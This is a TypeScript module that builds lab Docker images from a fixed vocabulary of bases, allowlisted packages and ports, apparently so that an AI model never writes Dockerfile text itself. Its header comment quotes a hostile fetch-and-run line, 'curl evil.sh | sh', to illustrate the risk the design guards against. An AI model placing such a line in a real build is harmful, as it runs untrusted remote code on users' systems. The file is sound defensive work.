/**
 * BUILDING A LAB IMAGE FOR A PROJECT, WITHOUT LETTING A MODEL WRITE CODE.
 *
 * This is the hardest thing in the lab engine to get right, and it is worth stating the
 * trap plainly: a Dockerfile is a program. `RUN curl evil.sh | sh` on line 14 of a
 * forty-line file is invisible to anyone scrolling an approval prompt, and "the user
 * approved it" would be true and worthless.
 *
 * So the model does not write a Dockerfile. It expresses INTENT — a base, some packages,
 * some ports — and this file renders the Dockerfile deterministically. Exactly the same
 * move as the recipe catalogue, one level up: intent from the model, artefact from code.
 *
 * What that costs: you cannot express everything. A project needing something outside the
 * vocabulary does not get a generated image — the person writes the Dockerfile themselves
 * in their workspace and Fadi builds THAT, labelled as theirs. Two honest paths beat one
 * dishonest one, and the authorship distinction is the same rule the evidence layer
 * already uses: a human's own work is not a machine's guess.
 */

export type PackageManager = "apt" | "apk";

export type Base = {
  image: string;
  manager: PackageManager;
  /** What it is good for, so the catalogue reads as choices rather than tags. */
  purpose: string;
};

export const BASES: Record<string, Base> = {
  "ubuntu-24.04": {
    image: "ubuntu:24.04",
    manager: "apt",
    purpose: "The default. Closest to what most servers actually run.",
  },
  "debian-12": {
    image: "debian:12-slim",
    manager: "apt",
    purpose: "Smaller than Ubuntu, same tooling.",
  },
  "alpine-3.20": {
    image: "alpine:3.20",
    manager: "apk",
    purpose: "Tiny. Good when the lab is about the service, not the OS.",
  },
  "python-3.12": {
    image: "python:3.12-slim",
    manager: "apt",
    purpose: "Python already installed, for automation and scripting work.",
  },
  "node-22": {
    image: "node:22-slim",
    manager: "apt",
    purpose: "Node already installed, for anything JavaScript.",
  },
};

/**
 * Packages Fadi may install, by manager.
 *
 * An ALLOWLIST, not a filter. The difference matters: a denylist of dangerous names is a
 * guess about what an attacker would pick, and it is wrong the moment someone thinks of a
 * package nobody listed. This is a closed set, and a name outside it is refused whether or
 * not anyone has heard of it.
 *
 * Broad enough to be useful for the infrastructure and security work this account is
 * aimed at — a lab that cannot install tcpdump is not a networking lab. These run INSIDE a
 * container, which is a different proposition from installing them on the host, and the
 * host is not reachable from here.
 */
const APT_PACKAGES = new Set([
  // shells, editors, basics
  "bash", "vim", "nano", "less", "man-db", "sudo", "tmux",
  // fetching and archives
  "curl", "wget", "git", "unzip", "zip", "tar", "gzip", "rsync",
  // build
  "build-essential", "make", "gcc", "g++", "pkg-config",
  // languages and runtimes
  "python3", "python3-pip", "python3-venv", "nodejs", "npm", "golang", "openjdk-17-jdk", "ruby",
  // web and proxies
  "nginx", "apache2", "haproxy",
  // databases and clients
  "postgresql", "postgresql-client", "mariadb-server", "mariadb-client", "redis-server", "redis-tools", "sqlite3",
  // directory, file and network services
  "samba", "smbclient", "openssh-server", "openssh-client", "bind9", "bind9-utils",
  "isc-dhcp-server", "vsftpd", "nfs-kernel-server", "ldap-utils", "slapd", "krb5-user",
  // networking and diagnosis
  "iproute2", "iputils-ping", "net-tools", "dnsutils", "netcat-openbsd", "socat",
  "tcpdump", "nmap", "traceroute", "telnet", "ethtool", "iperf3",
  // security and certificates
  "openssl", "ca-certificates", "gnupg", "ufw", "fail2ban", "auditd", "acl", "apparmor-utils",
  // observability
  "htop", "sysstat", "procps", "lsof", "strace", "jq", "tree",
  // automation
  "ansible", "cron", "supervisor",
]);

const APK_PACKAGES = new Set([
  "bash", "vim", "nano", "sudo", "tmux",
  "curl", "wget", "git", "unzip", "tar", "rsync",
  "build-base", "make", "gcc",
  "python3", "py3-pip", "nodejs", "npm", "go", "ruby",
  "nginx", "haproxy",
  "postgresql", "postgresql-client", "mariadb", "mariadb-client", "redis", "sqlite",
  "samba", "openssh", "openssh-client", "bind", "bind-tools",
  "iproute2", "iputils", "net-tools", "netcat-openbsd", "socat",
  "tcpdump", "nmap", "traceroute", "iperf3",
  "openssl", "ca-certificates", "gnupg",
  "htop", "procps", "lsof", "strace", "jq", "tree",
]);

export function allowedPackages(manager: PackageManager): Set<string> {
  return manager === "apk" ? APK_PACKAGES : APT_PACKAGES;
}

export type ImageSpec = {
  base: string;
  packages: string[];
  ports: number[];
  /** Where the person's work lives inside the container. */
  workdir: string;
};

export type SpecCheck = { ok: true; spec: ImageSpec } | { ok: false; reason: string };

/** A directory name inside the container. Narrow on purpose; it ends up in a COPY/WORKDIR. */
const WORKDIR_RE = /^\/[a-z0-9]([a-z0-9_-]{0,30}[a-z0-9])?$/;

export function validateImageSpec(raw: {
  base?: unknown;
  packages?: unknown;
  ports?: unknown;
  workdir?: unknown;
}): SpecCheck {
  const base = typeof raw.base === "string" ? raw.base.trim() : "";
  if (!BASES[base]) {
    return { ok: false, reason: "Pick a base from the list: " + Object.keys(BASES).join(", ") + "." };
  }

  const allowed = allowedPackages(BASES[base].manager);
  const requested = Array.isArray(raw.packages) ? raw.packages : [];
  if (requested.length > 30) {
    return { ok: false, reason: "That's more packages than a lab image should need." };
  }

  const packages: string[] = [];
  for (const item of requested) {
    const name = typeof item === "string" ? item.trim() : "";
    if (!allowed.has(name)) {
      // Named rather than silently dropped: a person reading "Fadi couldn't install X"
      // can decide to write the Dockerfile themselves, which is the other honest path.
      return {
        ok: false,
        reason:
          "Fadi won't install " +
          (name || "an unnamed package") +
          " — it isn't in the vetted list. Write the Dockerfile yourself in your workspace and Fadi will build that instead.",
      };
    }
    if (!packages.includes(name)) packages.push(name);
  }

  const rawPorts = Array.isArray(raw.ports) ? raw.ports : [];
  const ports: number[] = [];
  for (const p of rawPorts) {
    const n = Number(p);
    if (!Number.isInteger(n) || n < 1024 || n > 65535) {
      return { ok: false, reason: "Ports have to be whole numbers between 1024 and 65535." };
    }
    if (!ports.includes(n)) ports.push(n);
  }
  if (ports.length > 10) return { ok: false, reason: "That's too many ports for one lab." };

  const workdir = typeof raw.workdir === "string" && raw.workdir.trim() ? raw.workdir.trim() : "/lab";
  if (!WORKDIR_RE.test(workdir)) {
    return { ok: false, reason: "The working directory should look like /lab." };
  }

  // Sorted so the same intent always produces byte-identical output. A Dockerfile that
  // differs because a list arrived in another order would break the re-render comparison
  // at approval for no reason anyone could explain.
  packages.sort();
  ports.sort((a, b) => a - b);

  return { ok: true, spec: { base, packages, ports, workdir } };
}

/**
 * Render the Dockerfile. Deterministic, and every line is written here.
 *
 * There is no RUN that a caller can influence beyond the package names, and those have
 * already been checked against a closed set. No ARG, no ENTRYPOINT from input, no COPY
 * from an arbitrary path, no shell pipeline anywhere.
 */
export function composeDockerfile(spec: ImageSpec): string {
  const base = BASES[spec.base];
  const lines: string[] = [
    "# Written by Fadi from a fixed vocabulary — base, packages, ports.",
    "# Every line here is generated by lib/lab/image.ts. Edit it if you need more;",
    "# once you do, it is yours and Fadi will build it as your file rather than its own.",
    "FROM " + base.image,
  ];

  if (spec.packages.length > 0) {
    if (base.manager === "apt") {
      lines.push(
        "ENV DEBIAN_FRONTEND=noninteractive",
        "RUN apt-get update \\",
        " && apt-get install -y --no-install-recommends \\",
        ...spec.packages.map((p, i) => "      " + p + (i === spec.packages.length - 1 ? " \\" : " \\")),
        " && rm -rf /var/lib/apt/lists/*",
      );
    } else {
      lines.push("RUN apk add --no-cache \\", ...spec.packages.map((p) => "      " + p + " \\"), "      && true");
    }
  }

  lines.push("WORKDIR " + spec.workdir);
  for (const port of spec.ports) lines.push("EXPOSE " + port);

  // Keeps the container alive so someone can exec into it and work. Not an application
  // entrypoint — this is a machine to sit inside, not a service to run.
  lines.push('CMD ["sleep", "infinity"]');

  return lines.join("\n") + "\n";
}
